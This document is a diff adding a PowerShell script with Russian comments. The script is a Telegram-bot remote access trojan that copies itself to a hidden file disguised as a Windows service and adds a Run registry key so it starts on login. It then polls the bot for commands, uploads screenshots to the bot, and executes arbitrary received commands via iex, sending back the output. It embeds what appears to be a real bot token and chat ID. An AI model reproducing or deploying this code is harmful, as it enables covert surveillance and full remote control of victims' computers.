@@ -1,0 +1,71 @@
+# --- НАСТРОЙКИ ---
+$token = "8220355086:AAFI1_k4FoKIF18FShkBn0yezO5dDldzs88"
+$admin_id = "6494641721"
+$url_raw = "ССЫЛКА_НА_ЭТОТ_ЖЕ_ПАСТЕБИН_RAW" # Сюда вставь прямую ссылку на этот код
+
+# Путь для скрытой установки (косим под системный процесс)
+$install_path = "$env:APPDATA\Microsoft\Windows\Templates\win_services.ps1"
+$registry_name = "WindowsHostService"
+
+# 1. ЗАКРЕПЛЕНИЕ (Если запущен не из папки установки)
+if ($PSCommandPath -ne $install_path) {
+    if (!(Test-Path $install_path)) {
+        (New-Object Net.WebClient).DownloadFile($url_raw, $install_path)
+        # Скрываем файл (ставим атрибут "Скрытый")
+        (Get-Item $install_path).Attributes = 'Hidden'
+    }
+    # Прописка в реестр для автозапуска
+    $val = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$install_path`""
+    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $registry_name -Value $val
+}
+
+# 2. МАСКИРОВКА ПРОЦЕССА
+# Меняем заголовок окна (хотя оно и так скрыто)
+$host.ui.RawUI.WindowTitle = "Service Host"
+
+# 3. ФУНКЦИИ СВЯЗИ
+function Send-TG ($text) {
+    $url = "https://api.telegram.org/bot$token/sendMessage"
+    $body = @{ chat_id = $admin_id; text = "[$env:COMPUTERNAME] $text"; parse_mode = "Markdown" }
+    Invoke-RestMethod -Uri $url -Method Post -Body $body
+}
+
+function Get-Screenshot {
+    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+    $screen = [Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bmp = New-Object Drawing.Bitmap($screen.Width, $screen.Height)
+    $graphics = [Drawing.Graphics]::FromImage($bmp)
+    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+    $path = "$env:TEMP\sys_log.png"
+    $bmp.Save($path, [Drawing.Imaging.ImageFormat]::Png)
+    $graphics.Dispose(); $bmp.Dispose()
+    curl.exe -F "chat_id=$admin_id" -F "photo=@$path" "https://api.telegram.org/bot$token/sendPhoto"
+    Remove-Item $path
+}
+
+# Оповещение о запуске
+Send-TG "🦾 **Агент активен!**`nЗакрепление: Выполнено`nАвтозагрузка: OK"
+
+# ОСНОВНОЙ ЦИКЛ
+$last_id = 0
+while($true) {
+    try {
+        $updates = Invoke-RestMethod "https://api.telegram.org/bot$token/getUpdates?offset=$($last_id + 1)"
+        foreach ($upd in $updates.result) {
+            $last_id = $upd.update_id
+            $cmd = $upd.message.text
+            if ($upd.message.from.id -eq $admin_id) {
+                if ($cmd -eq "shot") { Get-Screenshot }
+                elseif ($cmd -eq "kill") { 
+                    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $registry_name
+                    Send-TG "💀 Самоликвидация выполнена. Автозагрузка удалена."; exit 
+                }
+                else {
+                    $out = iex $cmd 2>&1 | Out-String
+                    Send-TG "📄 Ответ:`n```$out```"
+                }
+            }
+        }
+    } catch { Start-Sleep -Seconds 10 }
+    Start-Sleep -Seconds 3
+}
